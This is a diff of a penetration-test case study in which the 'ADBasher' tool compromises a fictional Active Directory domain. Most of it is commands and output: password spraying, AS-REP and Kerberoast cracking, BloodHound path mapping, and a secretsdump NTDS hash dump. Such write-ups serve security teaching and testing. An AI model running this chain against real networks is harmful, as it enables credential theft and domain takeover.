@@ -66,9 +66,7 @@ Invoke-PasswordSprayOWA -ExchHostname mail.consolidatedfinance.com \
 
 **OPSEC Note:** Slow, measured approach prevented account lockouts and detection.
 
-#### Phase 3: Internal Enumeration via VPN (Day 1-2, 6-10 hours)
-
-**Objective:** Use compromised credentials to access internal network.
+**Objective:** Use compromised credentials to access internal network and launch automated AD assessment.
 
 **Actions Taken:**
 
@@ -79,66 +77,168 @@ Invoke-PasswordSprayOWA -ExchHostname mail.consolidatedfinance.com \
 # Connected to internal network
 # Assigned IP: 10.50.10.155
 
-# Launch ADBasher automated reconnaissance
+# Launch ADBasher automated assessment from internal position
 ./adbasher.py --target consfinance.local --opsec stealth
 
-# ADBasher discovered:
-# - 2 domain controllers (DC01, DC02)
-# - 234 domain users
-# - 87 computers
-# - LDAP anonymous bind: DISABLED
-# - SMB null sessions: BLOCKED
+# ADBasher Phase 1 Output (Reconnaissance):
+# [14:15:00] ADBasher v1.0 - Automated AD Pentesting Framework
+# [14:15:00] Session ID: f3a8c2b1
+# [14:15:00] Target: consfinance.local
+# [14:15:00] OpSec Mode: stealth
+#
+# [Phase 1] Reconnaissance
+#   -> DNS Discovery: consfinance.local
+#   ✓ Found DC: DC01.consfinance.local (10.50.1.10)
+#   ✓ Found DC: DC02.consfinance.local (10.50.1.11)
+#
+#   -> LDAP Anonymous Bind: 10.50.1.10
+#   ✗ Anonymous bind disabled (expected in hardened environment)
+#
+#   -> SMB Null Sessions: 10.50.0.0/16
+#   ✗ Null sessions blocked on all systems
+#
+# [Phase 2] Credential Attacks
+#   -> AS-REP Roast: consfinance.local
+#   ✓ Found 1 account with pre-auth disabled: legacy.admin
+#   ✓ Hash saved: ~/.adbasher/sessions/f3a8c2b1/asrep_hashes.txt
+#
+#   -> Password Spray: Using john.smith credentials for user enumeration
+#   ✓ Enumerated 234 domain users
+#   -> Testing 7 common passwords (30s delay between attempts)
+#   ✓ Valid: sarah.johnson:Fall2023!
+#   ✓ All credentials saved to session database
 ```
 
-**Findings:**
+**Findings After Phase 2**:
 
-- Internal network access achieved
-- Full AD enumeration completed
-- john.smith has standard user privileges (no admin)
+- 2 domain controllers discovered
+- 234 domain users enumerated
+- 2 valid credentials (john.smith and sarah.johnson from initial spray)
+- 1 AS-REP roastable hash captured
 
-#### Phase 4: Privilege Escalation Attempt (Day 2, 10-20 hours)
+**Reviewing ADBasher Session Database**:
 
-**Objective:** Escalate from standard user to admin privileges.
+```bash
+# Query collected credentials
+sqlite3 ~/.adbasher/sessions/f3a8c2b1/session.db
+
+sqlite> SELECT username, password, source FROM credentials WHERE is_valid=1;
+john.smith|Summer2023!|initial_access
+sarah.johnson|Fall2023!|password_spray
+legacy.admin|<HASH>|asrep_roast
+```
+
+#### Phase 4: Automated Credential Attacks & Privilege Escalation (Day 2, 10-20 hours)
+
+**Objective:** Let ADBasher automatically escalate privileges using discovered credentials.
 
 **Actions Taken:**
 
 ```bash
-# ADBasher automatically executed credential attacks:
+# ADBasher continues automated execution (still running from Phase 3)
+# Phase 3: Post-Exploitation (AUTO-TRIGGERED when valid creds found)
+#
+#   -> Kerberoasting: consfinance.local (using john.smith)
+#   ✓ Found 4 service accounts with SPNs
+#   ✓ Captured TGS tickets:
+#      - svc_backup@consfinance.local
+#      - svc_sql@consfinance.local
+#      - svc_sharepoint@consfinance.local
+#      - svc_monitoring@consfinance.local
+#   ✓ Hashes saved: ~/.adbasher/sessions/f3a8c2b1/kerberoast_hashes.txt
+#
+#   -> Admin Privilege Check
+#   ✓ Testing john.smith across 87 discovered systems
+#   ✗ No admin access with john.smith
+#   ✓ Testing sarah.johnson across 87 systems
+#   ✗ No admin access with sarah.johnson
 
-# 1. Kerberoasting
-# Found 4 service accounts with SPNs
-# Extracted TGS tickets
-# Offline cracking with Hashcat:
-#   - svc_backup: CRACKED (BackupP@ss2019)
-#   - svc_sql: No crack after 12 hours
-#   - svc_sharepoint: No crack
-#   - svc_monitoring: CRACKED (Monitor123!)
-
-# 2. AS-REP Roasting
-# Found 1 account with preauth disabled:
-#   - legacy.admin: CRACKED (OldP@ssword99)
-
-# 3. Checked admin privileges
-crackmapexec smb 10.50.10.0/24 -u svc_backup -p BackupP@ss2019 --local-auth
-# Result: svc_backup is LOCAL ADMIN on 12 servers!
+# Manual intervention: Crack captured hashes while ADBasher continues
+# (Running in parallel - ADBasher is still executing other modules)
 ```
 
-**Success:** Local admin access on 12 systems + 1 domain account (legacy.admin)
+**Manual Hash Cracking** (concurrent with ADBasher automation):
+
+```bash
+# Crack AS-REP roast hash
+hashcat -m 18200 ~/.adbasher/sessions/f3a8c2b1/asrep_hashes.txt rockyou.txt
+# Result: legacy.admin:OldP@ssword99 (cracked in 3 minutes)
+
+# Crack Kerberoast TGS tickets
+hashcat -m 13100 ~/.adbasher/sessions/f3a8c2b1/kerberoast_hashes.txt rockyou.txt
+# Results after 8 hours:
+#   - svc_backup:BackupP@ss2019 (CRACKED)
+#   - svc_monitoring:Monitor123! (CRACKED)
+#   - svc_sql: No crack after 12 hours
+#   - svc_sharepoint: No crack
+
+# Add cracked credentials back to ADBasher session
+sqlite3 ~/.adbasher/sessions/f3a8c2b1/session.db
+INSERT INTO credentials (username, password, domain, source, is_valid)
+VALUES ('legacy.admin', 'OldP@ssword99', 'consfinance.local', 'asrep_crack', 1);
+INSERT INTO credentials (username, password, domain, source, is_valid)
+VALUES ('svc_backup', 'BackupP@ss2019', 'consfinance.local', 'kerberoast_crack', 1);
+INSERT INTO credentials (username, password, domain, source, is_valid)
+VALUES ('svc_monitoring', 'Monitor123!', 'consfinance.local', 'kerberoast_crack', 1);
+```
+
+**Triggering ADBasher Re-check with New Credentials**:
+
+```bash
+# Run ADBasher admin check module with newly cracked creds
+python3 "6 validcreds/automated/check_admin.py" \
+  --session-dir ~/.adbasher/sessions/f3a8c2b1 \
+  --domain consfinance.local \
+  --username svc_backup \
+  --password BackupP@ss2019
+
+# Output:
+# [*] Testing svc_backup across 87 systems
+# [+] Local admin on: DC-BACKUP-01 (10.50.5.20)
+# [+] Local admin on: FILE-SRV-03 (10.50.10.45)
+# [+] Local admin on: SQL-PROD-02 (10.50.15.30)
+# [...12 total systems...]
+# ✓ svc_backup is LOCAL ADMIN on 12 servers!
+```
+
+**Success:** Local admin access on 12 systems via svc_backup credential
 
 #### Phase 5: BloodHound Analysis (Day 2, 20-24 hours)
 
-**Objective:** Map attack paths to Domain Admin using BloodHound.
+**Objective:** Analyze AD relationships to map attack path to Domain Admin.
 
 **Actions Taken:**
 
 ```bash
-# Collected BloodHound data with svc_backup credentials
-bloodhound-python -d consfinance.local -u svc_backup -p BackupP@ss2019 \
-  -dc DC01.consfinance.local -c All --zip
+# Trigger ADBasher BloodHound collection with admin credentials
+python3 "6 validcreds/automated/bloodhound_collect.py" \
+  --session-dir ~/.adbasher/sessions/f3a8c2b1 \
+  --domain consfinance.local \
+  --dc-ip 10.50.1.10 \
+  --username svc_backup \
+  --password BackupP@ss2019
 
-# Imported to BloodHound and ran queries:
-# 1. "Shortest Path to Domain Admins from Owned Principals"
-# 2. Marked svc_backup and legacy.admin as owned
+# ADBasher Output:
+# [*] Starting BloodHound collection for consfinance.local
+# [*] Running bloodhound-python collector...
+# [+] BloodHound data collected successfully
+# [+] Generated files: 20241212143022_computers.json, 20241212143022_users.json, ...
+# [+] ZIP archive: ~/.adbasher/sessions/f3a8c2b1/bloodhound_data/20241212143022_bloodhound.zip
+# [*] Upload to BloodHound GUI for analysis
+```
+
+**BloodHound Analysis** (manual):
+
+```bash
+# Upload collected data to BloodHound GUI
+# File: ~/.adbasher/sessions/f3a8c2b1/bloodhound_data/20241212143022_bloodhound.zip
+
+# Mark owned principals:
+# - svc_backup (owned)
+# - john.smith (owned)
+# - legacy.admin (owned)
+
+# Run query: "Shortest Path to Domain Admins from Owned Principals"
 ```
 
 **Critical Finding:**
@@ -181,7 +281,9 @@ svc_backup (Owned)
 
 **Objective:** Execute the attack path identified by BloodHound.
 
-**Actions Taken:**
+**Actions Taken (Manual - Precision Required)**:
+
+> [!NOTE] > **Why Manual Execution**: The specific ACL abuse attack path requires manual precision and verification. ADBasher automates discovery and post-exploitation, but surgical AD modifications are performed manually to maintain control and avoid unintended changes.
 
 ```bash
 # Step 1: Add svc_backup to IT-Admins group
@@ -197,13 +299,23 @@ Get-DomainGroupMember -Identity 'IT-Admins'
 # Step 3: Authenticate to DC as svc_backup (now has local admin)
 wmiexec.py consfinance.local/svc_backup:BackupP@ss2019@DC01.consfinance.local
 
-# Step 4: Dump NTDS.dit (Domain Admin hash database)
-secretsdump.py consfinance.local/svc_backup:BackupP@ss2019@DC01
+# Step 4: Use ADBasher secretsdump module for NTDS extraction
+python3 "6 validcreds/automated/secretsdump_auto.py" \
+  --session-dir ~/.adbasher/sessions/f3a8c2b1 \
+  --domain consfinance.local \
+  --dc-ip 10.50.1.10 \
+  --username svc_backup \
+  --password BackupP@ss2019
 ```
 
 **Expected Output:**
 
 ```
+[*] ADBasher Secretsdump Module
+[*] Target: DC01.consfinance.local (10.50.1.10)
+[*] Credentials: consfinance.local\svc_backup
+[*] Executing: secretsdump.py consfinance.local/svc_backup:***@10.50.1.10
+
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:89abc5d87ab29cd45ef8c129ab3d5634:::
@@ -214,6 +326,8 @@ krbtgt:502:aad3b435b51404eeaad3b435b51404ee:89abc5d87ab29cd45ef8c129ab3d5634:::
 [*] DPAPI secrets
 
 [+] Secretsdump complete: 234 NTLM hashes extracted
+[+] Hashes saved: ~/.adbasher/sessions/f3a8c2b1/ntds_hashes.txt
+[+] Database updated with 234 new credentials
 ```
 
 **Success:** DOMAIN ADMIN ACHIEVED (30 hours into 5-day engagement)
